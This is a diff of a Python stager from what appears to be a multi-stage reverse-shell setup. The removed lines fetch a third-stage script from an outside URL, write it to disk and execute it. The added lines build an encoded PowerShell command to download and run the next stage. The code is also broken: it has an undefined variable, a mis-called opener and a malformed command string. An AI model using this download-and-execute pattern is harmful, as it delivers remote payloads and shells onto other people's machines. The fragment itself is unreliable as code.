@@ -1,15 +1,8 @@
 ```python
-import urllib.request, os
+import urllib.request, base64, os
 
-# The stage 2 URL should point to the next script in your multi-stage setup.
-stage3_url = 'https://submerse.github.io/blog/reverse-shell-stages/stage3.py'
+# The PowerShell command to download and execute the next stage.
+command_to_execute = f'powershell -noj -noprofile -Command "{{ $encodedCommand }}"'
 
-urllib.request.install_opener()
-response = urllib.request.urlopen(stage3_url).read().decode()
-
-temp_stage3_file = 'temp_stage3.py'
-with open(temp_stage3_file, 'w') as f:
-    f.write(response)
-
-os.system(f'python {temp_stage3_file}')
+encoded_command = base64.b64encode(stage2_url).decode()
 ```
